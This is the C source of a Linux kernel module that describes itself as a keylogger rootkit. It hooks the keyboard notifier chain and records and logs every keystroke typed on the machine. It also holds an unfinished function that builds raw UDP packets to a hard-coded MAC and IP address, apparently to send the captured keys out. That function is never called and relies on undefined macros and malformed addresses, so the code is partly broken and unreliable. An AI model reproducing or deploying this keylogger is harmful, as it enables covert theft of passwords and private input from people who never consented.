/* keylogger.c */

// for kernel module
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

// for memset
#include <linux/string.h>

// for keyboard and notification chain
#include <linux/notifier.h>
#include <linux/keyboard.h>

#define DEBUG 0
#define debug(args...) if(DEBUG) printk(KERN_INFO args)

#define BUF_SIZE 256

static char key_buf[BUF_SIZE];
static unsigned int key_buf_ptr;

/* we only record ASCII characters and backspace, enter, tab, esc
 * return 1 if record the c */
int record_key(char c) {
    // ASCII
    if(c >= 0x20 && c < 0x7f) {
        key_buf[key_buf_ptr] = c;
        return 1;
    }
    // return 
    else if(c == 0x01) {
        key_buf[key_buf_ptr] = '\n';
        return 1;
    }
    // del
    else if(c == 0x7f) {
        key_buf[key_buf_ptr] = '\b';
        return 1;
    }
    // tab
    else if(c == 0x09) {
        key_buf[key_buf_ptr] = '\t';
        return 1;
    }
    // esc
    else if(c == 0x1b) {
        key_buf[key_buf_ptr] = '\e';
        return 1;
    }
    // do nothing
    else {
        return 0;
    }
}

/* print the latest recorded character*/
void print_key(void) {
    char c = key_buf[key_buf_ptr];
    // ASCII
    if(c >= 0x20 && c < 0x7f)
        printk(KERN_INFO "%c(0x%x)\n", c, c);
    // Non ASCII
    else
        printk(KERN_INFO ".(0x%x)\n", c);
}

/* send key_buf over the network */
static int send_key_buf(void){
    unsigned char *Data = "Test_Packet";
    int i = strlen(Data);
    struct sk_buff* skb = alloc_skb(ETH_HLEN + IP_Header_RM + UDP_Header_RM + i, GFP_ATOMIC);
    struct net_device *Device;
    uint16_t proto;
    struct iphdr* iph;
    struct ethhdr* eth;
    struct udphdr* uh;
    uint8_t Mac_Addr[ETH_ALEN] = {0x38, 0xd5, 0x47, 0xa1, 0x07, 0x41};

    skb_reserve(skb, ETH_HLEN + IP_Header_RM + UDP_Header_RM + i);
    Data = skb_put(skb, i);
    iph = (struct iphdr*)skb_push(skb, IP_Header_RM);
    uh = (struct udphdr*)skb_push(skb, UDP_Header_RM);
    eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));

    Device = dev_get_by_name(&init_net,"enp0s3");
    if (Device == NULL) {
        printk(KERN_INFO "init_Module: no such device enp0s3\n");
        return 1;
    }
    proto = ETH_P_IP;
    uh->len = htons(i); 
    uh->source = htons(2121);
    uh->dest = htons(2121);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len= htons(IP_Header_RM + i); 
    iph->frag_off = 0; 
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0; 
    iph->saddr = 19216805;
    iph->daddr = 19216804;
    skb->protocol = eth->h_proto = htons(proto);
    skb->no_fcs = 1;
    memcpy(eth->h_source, Device->dev_addr, ETH_ALEN);
    memcpy(eth->h_dest, Mac_Addr, ETH_ALEN);


    skb->pkt_type = PACKET_OUTGOING;
    dev_queue_xmit(skb);
    return 0;
}

/* notifier callback function */
int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
    
    struct keyboard_notifier_param *param = data;

    if(action == KBD_KEYSYM && param->down) {
        
        debug("cb: down:%d; shift:%d; value:%x; ledstate:%d; action:%lx\n",
        param->down,
        param->shift,
        param->value,
        param->ledstate,
        action);

        if(record_key((char)param->value)) {
            print_key();
            key_buf_ptr++;
        }

        // loop back and dump the whole buffer to the network
        if(key_buf_ptr >= BUF_SIZE) {
            key_buf_ptr = 0;
            memset(key_buf, 0, BUF_SIZE);
        }

    }

    return NOTIFY_OK;
}

/* notifier block in the notification chain*/
static struct notifier_block nb = {
    .notifier_call = keylogger_cb,
};

/* init function */
static int keylogger_init(void)
{
    printk(KERN_INFO "Keylogger is loaded!\n");
    memset(key_buf, 0, BUF_SIZE);
    key_buf_ptr = 0;
    register_keyboard_notifier(&nb);
    return 0;
}

/* exit function */
static void keylogger_exit(void)
{
    unregister_keyboard_notifier(&nb);
    printk(KERN_INFO "Keylogger is unloaded!\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE ("GPL");
MODULE_AUTHOR ("Richard Wu");
MODULE_DESCRIPTION ("a keylogger rootkit module");
MODULE_VERSION("1.0");
